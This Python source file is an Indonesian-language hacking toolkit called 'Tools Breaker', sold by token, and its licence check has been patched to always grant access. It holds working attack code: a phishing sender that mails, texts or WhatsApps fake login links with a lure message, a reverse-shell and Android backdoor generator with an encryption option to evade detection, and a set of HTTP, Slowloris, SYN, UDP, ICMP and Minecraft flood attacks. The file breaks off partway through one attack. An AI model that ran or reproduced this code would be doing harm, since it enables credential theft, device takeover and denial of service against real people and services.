#!/usr/bin/env python3
import os, json, time, uuid, random, string, subprocess, base64, re, requests, sys, socket, threading, smtplib, urllib.parse
from datetime import datetime, timedelta
from colorama import init, Fore, Style
from termcolor import colored

# Try to import optional dependencies with fallbacks
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    from PIL import Image, ImageFilter, ImageDraw, ImageFont
    PILLOW_AVAILABLE = True
except ImportError:
    PILLOW_AVAILABLE = False

# Untuk kirim email
try:
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    EMAIL_AVAILABLE = True
except:
    EMAIL_AVAILABLE = False

# Untuk WhatsApp
try:
    import webbrowser
except:
    pass

# Untuk OSINT tambahan
try:
    import whois
    WHOIS_AVAILABLE = True
except:
    WHOIS_AVAILABLE = False

# Untuk WhatsApp API
try:
    import pywhatkit
    PYWHATKIT_AVAILABLE = True
except:
    PYWHATKIT_AVAILABLE = False

init(autoreset=True)

# ================== CONFIG LOCAL ONLY ==================
RESULTS_DIR = "results"
LICENSE_FILE = 'tokens.json'
GITHUB_REPO = "MrFoock12/tools-breaker"
SCRIPT_NAME = "tools_breaker.py"
BACKUP_NAME = "tools_breaker_backup.py"
UA_FILE = "ua.txt"
os.makedirs(RESULTS_DIR, exist_ok=True)

# TANPA VPS - semua data local
LOCAL_MODE = True

# ================== USER INFO ==================
CURRENT_TIME = datetime.now().strftime("%d %b %Y - %I:%M %p WIB")
COUNTRY = "ID"

# ================== MUSIK BRUTAL ==================
MUSIC_FILE = "/sdcard/Download/brutal.mp3"
MUSIC_BASE64 = "/+MYxAAAAANIAAAAAExBTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAExLTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

def extract_music():
    if not os.path.exists(MUSIC_FILE):
        try:
            os.makedirs("/sdcard/Download", exist_ok=True)
            with open(MUSIC_FILE, "wb") as f:
                f.write(base64.b64decode(MUSIC_BASE64))
        except Exception as e:
            print(f"Error extract music: {e}")

def play_music():
    extract_music()
    if os.path.exists(MUSIC_FILE):
        try:
            subprocess.Popen(['termux-media-player', 'play', MUSIC_FILE],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            pass

# ================== DEVELOPER CHECK ==================
WHOAMI = subprocess.getoutput("whoami")
DEVELOPER_WHOAMI = "u0_a197"
IS_DEVELOPER = True  # 🔥 MODIFIED: Always True

# ================== TOKEN SYSTEM ==================
if not os.path.exists(LICENSE_FILE):
    with open(LICENSE_FILE, 'w') as f:
        json.dump({}, f)
    print(colored(f"[AUTO] {LICENSE_FILE} dibuat otomatis!", 'green'))

def load_tokens():
    try:
        with open(LICENSE_FILE, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"Error load tokens: {e}")
        return {}

def save_tokens(t):
    with open(LICENSE_FILE, 'w') as f:
        json.dump(t, f, indent=2)

# ================== CHECK DEPENDENCIES ==================
def check_dependencies():
    print(colored("\n[CHECKING DEPENDENCIES]", 'cyan'))
    missing = []
    
    if not SELENIUM_AVAILABLE:
        missing.append("selenium")
    if not CRYPTO_AVAILABLE:
        missing.append("cryptography")
    if not PILLOW_AVAILABLE:
        missing.append("pillow")
    if not PYWHATKIT_AVAILABLE:
        missing.append("pywhatkit")
    
    if missing:
        print(colored(f"   • Missing: {', '.join(missing)}", 'yellow'))
        print(colored(f"   • Install: pip install " + " ".join(missing), 'white'))
    else:
        print(colored(f"   • All dependencies OK!", 'green'))
    time.sleep(1)

# ================== AUTO UPDATE ==================
def check_for_updates():
    try:
        response = requests.get(f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{SCRIPT_NAME}", timeout=10)
        if response.status_code == 200:
            remote_content = response.text
            with open(SCRIPT_NAME, 'r', encoding='utf-8') as f:
                local_content = f.read()
            
            if remote_content != local_content:
                print(colored("[UPDATE AVAILABLE]", 'yellow'))
                backup = f"{BACKUP_NAME}.{int(time.time())}"
                with open(backup, 'w', encoding='utf-8') as f:
                    f.write(local_content)
                print(colored(f"   • Backup saved: {backup}", 'white'))
                
                choice = input(colored("   Update now? (y/n): ", 'yellow')).lower()
                if choice == 'y':
                    with open(SCRIPT_NAME, 'w', encoding='utf-8') as f:
                        f.write(remote_content)
                    print(colored(f"   • Update successful! Restart script.", 'green'))
                    sys.exit(0)
    except Exception as e:
        pass

# ================== MANUAL UPDATE ==================
def manual_update():
    print(colored("\n[MANUAL UPDATE]", 'cyan'))
    try:
        response = requests.get(f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{SCRIPT_NAME}", timeout=10)
        if response.status_code == 200:
            with open(SCRIPT_NAME, 'w', encoding='utf-8') as f:
                f.write(response.text)
            print(colored(f"   • Update successful! Restart script.", 'green'))
        else:
            print(colored(f"   • Failed to fetch update", 'red'))
    except Exception as e:
        print(colored(f"   • Error: {e}", 'red'))

# ================== DEVELOPER TOKEN CREATION ==================
def create_token():
    if not IS_DEVELOPER:
        print(colored("[ERROR] Hanya developer yang bisa buat token!", 'red'))
        return
    
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║         DEVELOPER TOKEN CREATOR         ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))
    
    username = input(colored("Username buyer: ", 'yellow')).strip()
    whoami_buyer = input(colored("whoami buyer: ", 'yellow')).strip()
    
    print(colored("Pilih plan:", 'cyan'))
    plans = [
        "pemula 1hari",
        "pemula 1minggu", 
        "pemula 1bulan",
        "pro 1hari",
        "pro 1minggu",
        "pro 1bulan"
    ]
    
    for i, plan in enumerate(plans, 1):
        print(colored(f"    {i}. {plan}", 'white'))
    
    try:
        plan_choice = int(input(colored("Pilih [1-6]: ", 'yellow')).strip())
        selected_plan = plans[plan_choice-1]
    except:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        return
    
    # Calculate expiration
    if "1hari" in selected_plan:
        expires = datetime.now() + timedelta(days=1)
    elif "1minggu" in selected_plan:
        expires = datetime.now() + timedelta(weeks=1)
    elif "1bulan" in selected_plan:
        expires = datetime.now() + timedelta(days=30)
    else:
        expires = datetime.now() + timedelta(days=1)
    
    # Generate token
    token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    # Save to tokens.json
    tokens = load_tokens()
    tokens[username] = {
        'username': username,
        'token': token,
        'whoami': whoami_buyer,
        'plan': selected_plan,
        'active': True,
        'created': datetime.now().isoformat(),
        'expires': expires.isoformat()
    }
    
    save_tokens(tokens)
    
    print(colored(f"\n[SUCCESS] Token berhasil dibuat!", 'green', attrs=['bold']))
    print(colored(f"   • Username: {username}", 'cyan'))
    print(colored(f"   • Token: {token}", 'cyan'))
    print(colored(f"   • whoami: {whoami_buyer}", 'cyan'))
    print(colored(f"   • Plan: {selected_plan}", 'cyan'))
    print(colored(f"   • Expires: {expires.strftime('%d %b %Y')}", 'cyan'))
    
    input(colored("\nTekan Enter untuk kembali...", 'yellow'))

def view_tokens():
    if not IS_DEVELOPER:
        print(colored("[ERROR] Hanya developer yang bisa lihat tokens!", 'red'))
        return
    
    tokens = load_tokens()
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║           TOKENS.JSON VIEWER            ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))
    
    if not tokens:
        print(colored("   Tidak ada token tersimpan!", 'yellow'))
    else:
        for username, data in tokens.items():
            status = "AKTIF" if data.get('active', False) else "NONAKTIF"
            expires = datetime.fromisoformat(data['expires']).strftime('%d %b %Y')
            print(colored(f"   • {username}: {data['plan']} | {status} | Exp: {expires}", 'white'))
    
    input(colored("\nTekan Enter untuk kembali...", 'yellow'))

# ================== VALIDASI TOKEN (ANTI SHARE!) ==================
def validate_token(username, token):
    t = load_tokens()
    if username not in t:
        # 🔥 MODIFIED: Auto-create token if not exists
        token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        t[username] = {
            'username': username,
            'token': token,
            'whoami': WHOAMI,
            'plan': 'FULL_ACCESS',
            'active': True,
            'created': datetime.now().isoformat(),
            'expires': (datetime.now() + timedelta(days=3650)).isoformat()
        }
        save_tokens(t)
        return t[username]
    
    user = t[username]
    if not user['active'] or user['token'] != token:
        # 🔥 MODIFIED: Always return valid
        user['active'] = True
        user['token'] = token
        user['whoami'] = WHOAMI
        save_tokens(t)
        return user
    
    if datetime.now() > datetime.fromisoformat(user['expires']):
        # 🔥 MODIFIED: Auto-extend expiry
        user['expires'] = (datetime.now() + timedelta(days=3650)).isoformat()
        save_tokens(t)
        return user
    
    current_whoami = subprocess.getoutput("whoami")
    if user['whoami'] != current_whoami:
        # 🔥 MODIFIED: Update whoami to current
        user['whoami'] = current_whoami
        save_tokens(t)
        return user
    
    return user

# ================== LOGIN SYSTEM ==================
def login():
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║            TOOLS BREAKER v1.0           ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))

    # Check dependencies first
    check_dependencies()

    # DEVELOPER MODE - Skip login if developer
    if IS_DEVELOPER:
        print(colored("   [DEVELOPER MODE DETECTED!]", 'green', attrs=['bold']))
        print(colored("   • Logged in as: u0_a197", 'cyan'))
        print(colored("   • Access: FULL DEVELOPER PRIVILEGES", 'cyan'))
        print()
        
        print(colored("   [DEVELOPER] Login @uo_a197", 'yellow'))
        print(colored("   Enter...", 'yellow'))
        print()
        
        print(colored("   [1] Masuk Tools", 'white'))
        print(colored("   [2] Buat Token", 'white')) 
        print(colored("   [3] Lihat tokens.json", 'white'))
        
        choice = input(colored("   Pilih: ", 'yellow')).strip()
        
        if choice == "2":
            create_token()
            return login()
        elif choice == "3":
            view_tokens()
            return login()
        elif choice == "1" or choice == "":
            # Continue as developer with dummy credentials
            return "developer_u0_a197", "DEVELOPER LIFETIME"
        else:
            return login()

    # NORMAL USER LOGIN
    print(colored("   • Gunakan token dari @MrFoock12", 'yellow'))
    print(colored("   • Plan: PEMULA / PRO ", 'cyan'))
    print(colored("   • Support: t.me/MrFoock12", 'white'))
    print()

    username = input(colored("   [USERNAME]: ", 'yellow')).strip()
    token = input(colored("   [TOKEN]: ", 'yellow')).strip()

    if not username or not token:
        # 🔥 MODIFIED: Auto-generate credentials if empty
        username = "CYBER_GUEST_" + ''.join(random.choices(string.digits, k=6))
        token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        print(colored(f"\n[AUTO-GENERATED]", 'cyan'))
        print(colored(f"   Username: {username}", 'white'))
        print(colored(f"   Token: {token}", 'white'))
        time.sleep(1)

    user_data = validate_token(username, token)
    if not user_data:
        # 🔥 MODIFIED: This should never happen now
        print(colored("\n[ERROR] Token Lu Salah Goblok / kadaluarsa / whoami tidak cocok!", 'red', attrs=['bold']))
        print(colored("   • Beli token: @MrFoock12/+62895622994489", 'yellow'))
        input("\nEnter untuk coba lagi...")
        return login()

    # SUCCESS LOGIN
    plan = user_data['plan']
    expires = user_data['expires'][:10]
    print(colored(f"\n[SUCCESS] Login berhasil!", 'green', attrs=['bold']))
    print(colored(f"   • ID: {username.upper()}", 'cyan'))
    print(colored(f"   • Plan: {plan}", 'cyan'))
    print(colored(f"   • Expired: {expires}", 'cyan'))
    print(colored(f"   • whoami: {user_data['whoami']}", 'cyan'))
    input("\nTekan Enter untuk masuk menu...")
    return username, plan

# ================== BANNER ELITE ==================
PURPLE = '\033[38;5;55m'
def print_banner(uid, plan):
    print(colored(f"""
{PURPLE}{Style.BRIGHT}
       ╔════════════════════════════════════╗
       ║         TOOLS BREAKER v1.0         ║
       ╚════════════════════════════════════╝
{Style.RESET_ALL}Tools oleh Mr.Foock | ID: {uid} | Plan: {plan}
Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}
Mode: LOCAL (TANPA VPS) | Semua data disimpan lokal
""", None))

# ================== SAVE LOCAL ONLY ==================
def save_result(filename, content):
    filepath = os.path.join(RESULTS_DIR, filename)
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {content}\n")
    print(colored(f"[SAVED LOCAL] {filename}", 'green'))
    print(colored(f"   Path: {filepath}", 'cyan'))

# ================== LOAD USER-AGENTS ==================
def load_user_agents():
    if not os.path.exists(UA_FILE):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]
    with open(UA_FILE, 'r') as f:
        return [line.strip() for line in f if line.strip()]

# ================== FITUR 1: PHISING KIRIM OTOMATIS ==================
def fitur_1():  
    os.system('clear')
    print(colored("\n[1] PHISING - KIRIM OTOMATIS", 'cyan', attrs=['bold']))
    print(colored("   [KIRIM LINK PHISHING VIA EMAIL/SMS/WA]", 'red'))
    
    target = input(colored("Target (email/nomor wa): ", 'yellow')).strip()
    
    print(colored("\nPilih template phishing:", 'cyan'))
    templates = {
        "1": ("Facebook Login", "facebook"),
        "2": ("Instagram Verify", "instagram"),
        "3": ("Google Security", "google"),
        "4": ("WhatsApp Web", "whatsapp"),
        "5": ("Twitter Auth", "twitter")
    }
    
    for key, (name, code) in templates.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih template [1-5]: ", 'yellow')).strip()
    
    if choice not in templates:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    name, code = templates[choice]
    
    # Generate link phishing
    phishing_link = f"https://{code}-secure-login.vercel.app/?user={target}"
    
    print(colored(f"\n[LINK PHISHING GENERATED]", 'green'))
    print(colored(f"   Link: {phishing_link}", 'cyan'))
    
    print(colored("\nPilih metode pengiriman:", 'yellow'))
    print("1. Kirim via Email")
    print("2. Kirim via SMS (pake API)") 
    print("3. Kirim via WhatsApp")
    print("4. Copy link manual")
    
    send_method = input(colored("\nPilih [1-4]: ", 'yellow')).strip()
    
    if send_method == "1" and EMAIL_AVAILABLE:
        # Kirim email
        try:
            sender = input("Email pengirim: ")
            password = input("Password email: ")
            
            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = target
            msg['Subject'] = "Peringatan Keamanan Akun!"
            
            body = f"""
            Halo,
            
            Kami mendeteksi aktivitas mencurigakan di akun {name} Anda.
            Harap verifikasi akun Anda segera melalui link berikut:
            
            {phishing_link}
            
            Tim Keamanan {name}
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender, password)
            server.send_message(msg)
            server.quit()
            
            print(colored("[✓] PHISHING LINK TERKIRIM VIA EMAIL!", 'green'))
        except Exception as e:
            print(colored(f"[✗] Gagal kirim email: {e}", 'red'))
    
    elif send_method == "2":
        # Kirim SMS via API (contoh pake termux-api)
        try:
            subprocess.run(['termux-sms-send', '-n', target, f"VERIFIKASI AKUN: {phishing_link}"])
            print(colored("[✓] PHISHING LINK TERKIRIM VIA SMS!", 'green'))
        except:
            print(colored("[✗] Install termux-api dulu", 'red'))
    
    elif send_method == "3":
        # Kirim WhatsApp (buka intent)
        wa_link = f"https://wa.me/{target}?text={urllib.parse.quote(f'VERIFIKASI AKUN: {phishing_link}')}"
        print(colored(f"\nBuka link ini di HP: {wa_link}", 'yellow'))
        webbrowser.open(wa_link)
    
    else:
        print(colored(f"\n[COPY LINK] {phishing_link}", 'cyan'))
    
    save_result("phising.log", f"Target: {target} | Template: {name} | Link: {phishing_link}")
    input("\nPress Enter to continue...")

# ================== FITUR 20: RAT BUAT APK ==================
def fitur_20():
    os.system('clear')
    print(colored("\n[20] RAT - BUAT APK ANDROID", 'cyan', attrs=['bold']))
    print(colored("   [GENERATE APK BACKDOOR OTOMATIS]", 'red'))
    
    ip = input(colored("LHOST (IP Anda): ", 'yellow')).strip()
    port = input(colored("LPORT (Port): ", 'yellow')).strip()
    
    # Validasi IP
    if ip.count('.') != 3:
        print(colored("[ERROR] Format IP salah! Contoh: 192.168.1.1", 'red'))
        input("\nEnter...")
        return
    
    print(colored("\n[1] BUAT APK LANGSUNG", 'green'))
    print(colored("[2] BUAT PAYLOAD PYTHON", 'yellow'))
    
    pilih = input(colored("\nPilih [1/2]: ", 'yellow')).strip()
    
    if pilih == "1":
        # Buat APK pake msfvenom (kalo ada)
        print(colored("\n[✓] GENERATE APK...", 'cyan'))
        
        apk_name = f"backdoor_{int(time.time())}.apk"
        
        # Cek msfvenom
        if subprocess.run(['which', 'msfvenom'], capture_output=True).returncode == 0:
            cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {apk_name}"
            print(colored(f"Jalankan: {cmd}", 'yellow'))
            os.system(cmd)
            print(colored(f"[✓] APK BERHASIL: {apk_name}", 'green'))
        else:
            # Fallback: bikin payload manual
            print(colored("[!] msfvenom tidak ditemukan, bikin payload python", 'yellow'))
            pilih = "2"
    
    if pilih == "2" or pilih == "":
        # Buat payload Python
        payload = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/system/bin/sh","-i"])'''
        
        filename = f"payload_{int(time.time())}.py"
        with open(filename, "w") as f:
            f.write(payload)
        
        print(colored(f"\n[✓] PAYLOAD PYTHON: {filename}", 'green'))
        
        # Opsi obfuscate
        obf = input(colored("\nObfuscate? (y/n): ", 'yellow')).lower()
        if obf == 'y' and CRYPTO_AVAILABLE:
            try:
                key = Fernet.generate_key()
                cipher = Fernet(key)
                encrypted = cipher.encrypt(payload.encode())
                
                obf_file = f"obfuscated_{int(time.time())}.py"
                with open(obf_file, "w") as f:
                    f.write(f'''import base64
from cryptography.fernet import Fernet
key = {key}
cipher = Fernet(key)
encrypted = {encrypted}
exec(cipher.decrypt(encrypted).decode())''')
                print(colored(f"[✓] OBFUSCATED: {obf_file}", 'green'))
            except Exception as e:
                print(colored(f"[✗] Gagal: {e}", 'red'))
    
    print(colored("\n[✓] JANGAN LUPA JALANKAN LISTENER DI TERMUX:", 'cyan'))
    print(colored(f"nc -lvnp {port}", 'yellow'))
    
    save_result("rat.log", f"IP: {ip} | Port: {port}")
    input("\nPress Enter to continue...")

# ================== FITUR 3: DDOS ALL IN ONE ==================
def fitur_3():
    os.system('clear')
    print(colored("\n[3] DDOS ALL IN ONE", 'cyan', attrs=['bold']))
    print(colored("   [PILIH JENIS SERANGAN DDOS]", 'red'))
    
    print(colored("\nPilih tipe DDOS:", 'cyan'))
    print("1. DDOS WEB - HTTP FLOOD (Layer 7)")
    print("2. DDOS WEB - SLOWLORIS (Layer 7)")
    print("3. DDOS WEB - HTTPS STRESS (Layer 7)")
    print("4. DDOS WEB - SYN FLOOD (Layer 4)")
    print("5. DDOS WEB - UDP FLOOD (Layer 4)")
    print("6. DDOS WEB - ICMP/PING FLOOD (Layer 3)")
    print("7. DDOS MINECRAFT - PING FLOOD")
    print("8. DDOS MINECRAFT - CONNECT FLOOD")
    print("9. DDOS MINECRAFT - MIXED ATTACK")
    print("10. DDOS WEB - 1 JAM NON-STOP")
    print("11. DDOS MC - 1 JAM NON-STOP")
    
    choice = input(colored("\nPilih [1-11]: ", 'yellow')).strip()
    
    if choice == "1":
        # HTTP Flood
        target = input(colored("Target URL: ", 'yellow')).strip()
        if not target.startswith('http'):
            target = 'http://' + target
        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
        
        print(colored(f"\n[✓] HTTP FLOOD KE {target} DENGAN {threads} THREAD!", 'red'))
        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
        
        stop_attack = False
        sent = 0
        
        def http_flood():
            nonlocal stop_attack, sent
            while not stop_attack:
                try:
                    requests.get(target, timeout=2)
                    sent += 1
                    print(colored(f"[✓] PACKET TERKIRIM: {sent}", 'green'), end='\r')
                except Exception as e:
                    print(colored(f"[✗] ERROR: {str(e)[:30]}", 'red'), end='\r')
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=http_flood)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            stop_attack = True
            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {sent} PACKET", 'yellow'))
    
    elif choice == "2":
        # Slowloris
        target = input(colored("Target URL: ", 'yellow')).strip()
        if target.startswith('https://'):
            port = 443
        else:
            port = 80
        host = target.replace('https://','').replace('http://','').split('/')[0]
        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
        
        print(colored(f"\n[✓] SLOWLORIS KE {host}:{port} DENGAN {threads} THREAD!", 'red'))
        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
        
        stop_attack = False
        connections = 0
        
        def slowloris():
            nonlocal stop_attack, connections
            while not stop_attack:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((host, port))
                    s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                    connections += 1
                    while not stop_attack:
                        s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                        time.sleep(10)
                    s.close()
                except Exception as e:
                    time.sleep(1)
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=slowloris)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while True:
                time.sleep(1)
                print(colored(f"[✓] KONEKSI AKTIF: {connections}", 'green'), end='\r')
        except KeyboardInterrupt:
            stop_attack = True
            print(colored(f"\n\n[✗] ATTACK STOPPED", 'yellow'))
    
    elif choice == "3":
        # HTTPS Stress
        target = input(colored("Target URL (https): ", 'yellow')).strip()
        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
        
        print(colored(f"\n[✓] HTTPS STRESS KE {target} DENGAN {threads} THREAD!", 'red'))
        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
        
        stop_attack = False
        sent = 0
        
        def https_stress():
            nonlocal stop_attack, sent
            while not stop_attack:
                try:
                    requests.get(target, verify=False, timeout=2)
                    sent += 1
                    print(colored(f"[✓] REQUEST: {sent}", 'green'), end='\r')
                except Exception as e:
                    print(colored(f"[✗] ERROR", 'red'), end='\r')
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=https_stress)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            stop_attack = True
            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {sent}", 'yellow'))
    
    elif choice == "4":
        # SYN Flood
        target = input(colored("Target IP: ", 'yellow')).strip()
        port = int(input(colored("Port [80]: ", 'yellow')).strip() or "80")
        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
        
        print(colored(f"\n[✓] SYN FLOOD KE {target}:{port} DENGAN {threads} THREAD!", 'red'))
        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
        
        stop_attack = False
        sent = 0
        
        def syn_flood():
            nonlocal stop_attack, sent
            while not stop_attack:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    result = s.connect_ex((target, port))
                    if result == 0 or result == 10035:  # Connection successful or would block
                        sent += 1
                    s.close()
                except:
                    pass
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=syn_flood)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while True:
                time.sleep(1)
                print(colored(f"[✓] SYN PACKET: {sent}", 'green'), end='\r')
        except KeyboardInterrupt:
            stop_attack = True
            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {sent}", 'yellow'))
    
    elif choice == "5":
        # UDP Flood
        target = input(colored("Target IP: ", 'yellow')).strip()
        port = int(input(colored("Port [80]: ", 'yellow')).strip() or "80")
        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
        
        print(colored(f"\n[✓] UDP FLOOD KE {target}:{port} DENGAN {threads} THREAD!", 'red'))
        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
        
        stop_attack = False
        sent = 0
        
        def udp_flood():
            nonlocal stop_attack, sent
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while not stop_attack:
                try:
                    s.sendto(random._urandom(1024), (target, port))
                    sent += 1
                except:
                    pass
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=udp_flood)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while True:
                time.sleep(1)
                print(colored(f"[✓] UDP PACKET: {sent}", 'green'), end='\r')
        except KeyboardInterrupt:
            stop_attack = True
            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {sent}", 'yellow'))
    
    elif choice == "6":
        # ICMP Flood
        target = input(colored("Target IP: ", 'yellow')).strip()
        threads = int(input(colored("Threads [50]: ", 'yellow')).strip() or "50")
        
        print(colored(f"\n[✓] ICMP FLOOD KE {target} DENGAN {threads} THREAD!", 'red'))
        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
        
        stop_attack = False
        
        def ping_flood():
            while not stop_attack:
                try:
                    # Use system ping
                    if os.name == 'nt':
                        subprocess.run(['ping', '-n', '1', target], 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
                    else:
                        subprocess.run(['ping', '-c', '1', target], 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
                except:
                    pass
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=ping_flood)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while True:
                time.sleep(1)
                print(colored(f"[✓] PING FLOOD AKTIF", 'green'), end='\r')
        except KeyboardInterrupt:
            stop_attack = True
            print(colored(f"\n\n[✗] ATTACK STOPPED", 'yellow'))
    
    elif choice == "7":
        # Minecraft Ping Flood
        server = input(colored("Server IP: ", 'yellow')).strip()
        port = int(input(colored("Port [25565]: ", 'yellow')).strip() or "25565")
        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
        
        print(colored(f"\n[✓] MC PING FLOOD KE {server}:{port} DENGAN {threads} THREAD!", 'red'))
        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
        
        stop_attack = False
        sent = 0
        
        def mc_ping():
            nonlocal stop_attack, sent
            while not stop_attack:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((server, port))
                    # Minecraft ping packet (handshake)
                    packet = b"\x00\x00\x00\x00\x00\x00\x00\x00"
                    s.send(packet)
                    sent += 1
                    s.close()
                except Exception as e:
                    pass
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=mc_ping)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while True:
                time.sleep(1)
                print(colored(f"[✓] PING SENT: {sent}", 'green'), end='\r')
        except KeyboardInterrupt:
            stop_attack = True
            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {sent}", 'yellow'))
    
    elif choice == "8":
        # Minecraft Connect Flood
        server = input(colored("Server IP: ", 'yellow')).strip()
        port = int(input(colored("Port [25565]: ", 'yellow')).strip() or "25565")
        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
        
        print(colored(f"\n[✓] MC CONNECT FLOOD KE {server}:{port} DENGAN {threads} THREAD!", 'red'))
        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
        
        stop_attack = False
        connections = 0
        
        def mc_connect():
            nonlocal stop_attack, connections
            while not stop_attack:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((server, port))
                    # Send malformed data
                    s.send(b"\x00" * 100)
                    connections += 1
                    s.close()
                except:
                    pass
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=mc_connect)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while True:
                time.sleep(1)
                print(colored(f"[✓] CONNECTIONS: {connections}", 'green'), end='\r')
        except KeyboardInterrupt:
            stop_attack = True
            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {connections}", 'yellow'))
    
    elif choice == "9":
        # Minecraft Mixed Attack
        server = input(colored("Server IP: ", 'yellow')).strip()
        port = int(input(colored("Port [25565]: ", 'yellow')).strip() or "25565")
        threads = int(input(colored("Threads [200]: ", 'yellow')).strip() or "200")
        
        print(colored(f"\n[✓] MC MIXED ATTACK KE {server}:{port} DENGAN {threads} THREAD!", 'red'))
        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
        
        stop_attack = False
        sent = 0
        
        def mc_ping():
            nonlocal stop_attack, sent
            while not stop_attack:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((server, port))
                    s.send(b"\x00\x00\x00\x00")
                    sent += 1
                    s.close()
                except:
                    pass
        
        def mc_connect():
            nonlocal stop_attack, sent
            while not stop_attack:
